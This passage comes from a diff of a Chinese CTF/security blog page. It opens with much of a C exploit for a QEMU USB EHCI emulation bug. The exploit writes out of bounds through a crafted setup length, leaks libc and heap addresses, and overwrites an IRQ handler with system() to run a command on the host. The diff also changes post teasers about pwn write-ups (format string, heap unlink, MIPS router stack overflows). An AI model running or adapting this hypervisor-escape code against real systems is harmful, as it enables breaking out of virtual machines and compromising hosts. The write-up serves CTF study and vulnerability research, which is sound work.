virt2phys(dmabuf));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, <span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_length</span><span class="params">(<span class="keyword">uint16_t</span> len, <span class="keyword">uint8_t</span> in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x4</span>);</span><br><span class="line">    setup_buf[<span class="number">0</span>] = in;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = len &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (len &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    qh-&gt;epchar = <span class="number">0x00</span>;</span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virt2phys(dmabuf + <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span> | <span class="number">2</span> &lt;&lt; <span class="number">8</span> | <span class="number">8</span> &lt;&lt; <span class="number">16</span>;  <span class="comment">// 2 &lt;&lt;8 go to do_token_setup</span></span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x300</span>);</span><br><span class="line">    dmabuf32[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x100</span>) + <span class="number">0x2</span>;</span><br><span class="line">    mmio_write(<span class="number">0x28</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x2c</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>, virt2phys(dmabuf));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, <span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_length3</span><span class="params">(<span class="keyword">uint16_t</span> len, <span class="keyword">uint8_t</span> in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dmabuf + <span class="number">0x400</span>, <span class="number">0x61</span>, <span class="number">0x1000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x4</span>);</span><br><span class="line">    setup_buf[<span class="number">0</span>] = in;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = len &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (len &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    qh-&gt;epchar = <span class="number">0x00</span>;</span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virt2phys(dmabuf + <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x1304</span>] = <span class="number">0x2</span>;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x1308</span>] = <span class="number">0x5000</span>;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x130c</span>] = <span class="number">0xffffefe8</span>;  <span class="comment">//set s-&gt;setup_index -8</span></span><br><span class="line">    qtd-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span> | <span class="number">0</span> &lt;&lt; <span class="number">8</span> | <span class="number">0x1010</span> &lt;&lt; <span class="number">16</span>;  <span class="comment">//write len is 0x1000, 0 &lt;&lt; 8 got to write</span></span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x300</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virt2phys(dmabuf + <span class="number">0x1300</span>);</span><br><span class="line">    dmabuf32[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x100</span>) + <span class="number">0x2</span>;</span><br><span class="line">    mmio_write(<span class="number">0x28</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x2c</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>, virt2phys(dmabuf));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, <span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_length4</span><span class="params">(<span class="keyword">uint16_t</span> len, <span class="keyword">uint8_t</span> in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x4</span>);</span><br><span class="line">    setup_buf[<span class="number">0</span>] = in;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = len &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (len &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    qh-&gt;epchar = <span class="number">0x00</span>;</span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virt2phys(dmabuf + <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x1308</span>] = <span class="number">0x2</span>;</span><br><span class="line">    <span class="comment">//*(int *)&amp;dmabuf[0x130c] = 0x14f4-0x1018;</span></span><br><span class="line"></span><br><span class="line">    *(ptr + <span class="number">1221</span>) = <span class="number">0x16fc</span>	<span class="number">-0x1018</span>;</span><br><span class="line">    *(ptr + <span class="number">1221</span> - <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">    qtd-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span> | <span class="number">0</span> &lt;&lt; <span class="number">8</span> | <span class="number">0x1018</span> &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x300</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virt2phys(dmabuf + <span class="number">0x1300</span>);</span><br><span class="line">    dmabuf32[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x100</span>) + <span class="number">0x2</span>;</span><br><span class="line">    mmio_write(<span class="number">0x28</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x2c</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>, virt2phys(dmabuf));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, <span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_copy_read</span><span class="params">(<span class="keyword">uint16_t</span> len, <span class="keyword">uint8_t</span> in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x4</span>);</span><br><span class="line">    qh-&gt;epchar = <span class="number">0x00</span>;</span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virt2phys(dmabuf + <span class="number">0x200</span>);</span><br><span class="line">    qtd-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span> | <span class="number">1</span> &lt;&lt; <span class="number">8</span> | <span class="number">0x1100</span> &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x300</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virt2phys(dmabuf + <span class="number">0x1300</span>);</span><br><span class="line">    dmabuf32[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x100</span>) + <span class="number">0x2</span>;</span><br><span class="line">    mmio_write(<span class="number">0x28</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x2c</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>, virt2phys(dmabuf));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, <span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_length6</span><span class="params">(<span class="keyword">uint16_t</span> len, <span class="keyword">uint8_t</span> in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dmabuf + <span class="number">0x400</span>, <span class="number">0x61</span>, <span class="number">0x1000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x4</span>);</span><br><span class="line">    setup_buf[<span class="number">0</span>] = in;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = len &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (len &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    qh-&gt;epchar = <span class="number">0x00</span>;</span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virt2phys(dmabuf + <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x1304</span>] = <span class="number">0x2</span>;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x1308</span>] = <span class="number">0x5000</span>;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x130c</span>] = <span class="number">0xffffe524</span>;  <span class="comment">//set s-&gt;setup_index -0xacc (point to irq-&gt;handler)</span></span><br><span class="line">    qtd-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span> | <span class="number">0</span> &lt;&lt; <span class="number">8</span> | <span class="number">0x1010</span> &lt;&lt; <span class="number">16</span>;  <span class="comment">//write len is 0x1000, 0 &lt;&lt; 8 got to write</span></span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x300</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virt2phys(dmabuf + <span class="number">0x1300</span>);</span><br><span class="line">    dmabuf32[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x100</span>) + <span class="number">0x2</span>;</span><br><span class="line">    mmio_write(<span class="number">0x28</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x2c</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>, virt2phys(dmabuf));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, <span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">final_write</span><span class="params">(<span class="keyword">uint16_t</span> len, <span class="keyword">uint8_t</span> in,<span class="keyword">long</span> <span class="keyword">long</span> system,<span class="keyword">long</span> <span class="keyword">long</span> irq_handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x4</span>);</span><br><span class="line">    setup_buf[<span class="number">0</span>] = in;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = len &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (len &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    qh-&gt;epchar = <span class="number">0x00</span>;</span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virt2phys(dmabuf + <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;dmabuf[<span class="number">0x1308</span>] = <span class="number">0x2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *ptr2;</span><br><span class="line">    ptr2 = &amp;dmabuf[<span class="number">0x300</span>];</span><br><span class="line">    *(ptr2) = system;<span class="comment">//system plt</span></span><br><span class="line">    *(ptr2 + <span class="number">1</span>) = irq_handler + <span class="number">0x10</span>;</span><br><span class="line">    *(ptr2 + <span class="number">2</span>) = <span class="number">0x636c616378</span>; <span class="comment">//xcalc</span></span><br><span class="line"></span><br><span class="line">    *(ptr + <span class="number">1221</span>) = <span class="number">0x16fc</span> - <span class="number">0x1018</span>;</span><br><span class="line">    *(ptr + <span class="number">1221</span> - <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">    qtd-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span> | <span class="number">0</span> &lt;&lt; <span class="number">8</span> | <span class="number">0x18</span> &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x300</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virt2phys(dmabuf + <span class="number">0x1300</span>);</span><br><span class="line">    dmabuf32[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x100</span>) + <span class="number">0x2</span>;</span><br><span class="line">    mmio_write(<span class="number">0x28</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x2c</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>, virt2phys(dmabuf));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, <span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (mmio_read(<span class="number">0x20</span>) != <span class="number">0x100400080000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error:%p "</span>, mmio_read(<span class="number">0x20</span>));</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Start!"</span>);</span><br><span class="line">    <span class="comment">//---------------------- First Step : leak data_buf addr</span></span><br><span class="line">    <span class="comment">//send a normal packet,set s-&gt;setup_state to SETUP_DATA_STATE(2)</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"set s-&gt;setup_state:SETUP_DATA_STATE"</span>);</span><br><span class="line">    init_state();</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    check();</span><br><span class="line">    <span class="comment">//send a deformity,set s-&gt;setup_len to 0x5000</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"set s-&gt;setup_len:0x5000"</span>);</span><br><span class="line">    set_length(<span class="number">0x5000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    usleep(<span class="number">500000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//write out of bounds</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"write out of bounds,set setup_index -8"</span>);</span><br><span class="line">    set_length3(<span class="number">0x5000</span>, <span class="number">0x80</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    check();</span><br><span class="line">    <span class="comment">//write out of bounds,set s-&gt;setup_buf for leak address</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"write out of bounds,set s-&gt;setup_buf and s-&gt;setup_index"</span>);</span><br><span class="line">    set_length4(<span class="number">0x5000</span>, <span class="number">0x80</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    check();</span><br><span class="line">    <span class="comment">//now leak address</span></span><br><span class="line">    <span class="comment">//read text address</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read text address"</span>);</span><br><span class="line">    do_copy_read(<span class="number">0x5000</span>,<span class="number">0x80</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    check();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *ptrr = dmabuf + <span class="number">0x300</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> libc_base = *ptrr - <span class="number">0x51a92b</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *heap = dmabuf + <span class="number">0x308</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> system = libc_base + <span class="number">0x2038d0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> irq_handler = *heap - <span class="number">0x2e88</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> irq_opaque = *heap - <span class="number">0x2e80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc_base: %p\n"</span>,libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system: %p\n"</span>,system);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"irq_handler: %p\n"</span>,irq_handler);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"irq_opaque: %p\n"</span>,irq_opaque);</span><br><span class="line">    <span class="comment">//irq-&gt;handler: 0x5555592bb138</span></span><br><span class="line">    <span class="comment">//irq-&gt;opaque: 0x5555592bb140</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//restart</span></span><br><span class="line">    init_state();</span><br><span class="line">    check();</span><br><span class="line">    set_length(<span class="number">0x5000</span>, <span class="number">0</span>);</span><br><span class="line">    usleep(<span class="number">500000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write irq-&gt;handler</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"change s-&gt;setup_index point to irq-&gt;handler"</span>);</span><br><span class="line">    set_length6(<span class="number">0x5000</span>,<span class="number">0x80</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    check();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"change irq-&gt;handler"</span>);</span><br><span class="line">    final_write(<span class="number">0x5000</span>,<span class="number">0x80</span>,system,irq_handler);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    check();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"pwn it?"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/23/第三届“强网”拟态国际精英挑战赛/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/23/第三届“强网”拟态国际精英挑战赛/" itemprop="url">第三届“强网”拟态精英挑战赛pwn全解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-23T13:11:13+08:00">
+                2020-06-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="easy-stack"><a href="#easy-stack" class="headerlink" title="easy_stack"></a>easy_stack</h2><p>格式化字符串泄漏canary后和libc，gets栈溢出</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/01/AFL源码分析计划3/#more" rel="contents">
+            <a class="btn" href="/2020/06/23/第三届“强网”拟态国际精英挑战赛/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -440,7 +800,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/30/AFL源码分析计划2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/路由器漏洞挖掘入门之栈溢出/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -459,7 +819,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/05/30/AFL源码分析计划2/" itemprop="url">AFL源码分析计划2 -- afl-as.c</a></h1>
+                <a class="post-title-link" href="/2020/06/21/路由器漏洞挖掘入门之栈溢出/" itemprop="url">路由器漏洞挖掘入门之栈溢出</a></h1>
         
 
         <div class="post-meta">
@@ -471,8 +831,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-30T20:46:37+08:00">
-                2020-05-30
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
               </time>
             
 
@@ -494,8 +854,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuzz/" itemprop="url" rel="index">
-                    <span itemprop="name">fuzz</span>
+                  <a href="/categories/IOT/" itemprop="url" rel="index">
+                    <span itemprop="name">IOT</span>
                   </a>
                 </span>
 
@@ -532,12 +892,17 @@
 
       
         
-          <p>从main函数开始</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u8* inst_ratio_str = getenv(<span class="string">"AFL_INST_RATIO"</span>);</span><br></pre></td></tr></table></figure>
-<p>先是从环境变量中拿了<code>AFL_INST_RATIO</code>，这是插入指令的密度</p>
+          <h2 id="x86和MIPS指令集的差异"><a href="#x86和MIPS指令集的差异" class="headerlink" title="x86和MIPS指令集的差异"></a>x86和MIPS指令集的差异</h2><p>1、MIPS指令系统大量使用寄存器，包括返回地址也是存放在ra寄存器中的</p>
+<p>2、没有堆栈直接操作的指令，也就是就没有push 和pop 指令</p>
+<p>3、所有指令都是32位编码，也就是说所有的数据和指令都是4字节对齐</p>
+<blockquote>
+<p>由于MIPS固定指令长度，造成其编译后的二进制文件和内存占用空间比x86的要大</p>
+<p>MIPS指令集使用uclibc C标准库，x86使用libc的C标准库</p>
+</blockquote>
+<p>MIPS的指令用法和两者的差异可以参考<a href="https://blog.csdn.net/gujing001/article/details/8476685" target="_blank" rel="noopener">这里</a></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/05/30/AFL源码分析计划2/#more" rel="contents">
+            <a class="btn" href="/2020/06/21/路由器漏洞挖掘入门之栈溢出/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -588,7 +953,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/28/AFL源码分析计划1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/第五空间/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -607,7 +972,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/05/28/AFL源码分析计划1/" itemprop="url">AFL源码分析计划1 -- afl-gcc.c</a></h1>
+                <a class="post-title-link" href="/2020/06/21/第五空间/" itemprop="url">第五**空间pwn部分wp</a></h1>
         
 
         <div class="post-meta">
@@ -619,8 +984,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-28T17:11:33+08:00">
-                2020-05-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
               </time>
             
 
@@ -629,28 +994,6 @@
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuzz/" itemprop="url" rel="index">
-                    <span itemprop="name">fuzz</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -680,11 +1023,13 @@
 
       
         
-          <p>从main函数开始，可以看到主要就这三行</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);</span><br></pre></td></tr></table></figure>
+          <p>发现太久没有写博客了，就放一下刚打完的被喷得怪可怜的第5**空间的一点wp吧。</p>
+<h2 id="立雪"><a href="#立雪" class="headerlink" title="立雪"></a>立雪</h2><p>edit 函数没有对size进行检测，所以可以任意长度的堆溢出</p>
+<p>​         <img src="\images\第五空间\1.png" alt>       </p>
+<p>而且程序存在后门函数，unlink到0x602088修改为0xffff即可(其实最快速的做法是unsortedbin attack到<code>0x602088</code>)</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/05/28/AFL源码分析计划1/#more" rel="contents">
+            <a class="btn" href="/2020/06/21/第五空间/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -735,7 +1080,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/26/oss-fuzz初探/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/解决git clone下载慢问题/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -754,7 +1099,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/05/26/oss-fuzz初探/" itemprop="url">oss-fuzz没什么用笔记</a></h1>
+                <a class="post-title-link" href="/2020/06/21/解决git clone下载慢问题/" itemprop="url">解决git clone下载慢或失败问题</a></h1>
         
 
         <div class="post-meta">
@@ -766,448 +1111,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-26T15:27:58+08:00">
-                2020-05-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuzz/" itemprop="url" rel="index">
-                    <span itemprop="name">fuzz</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
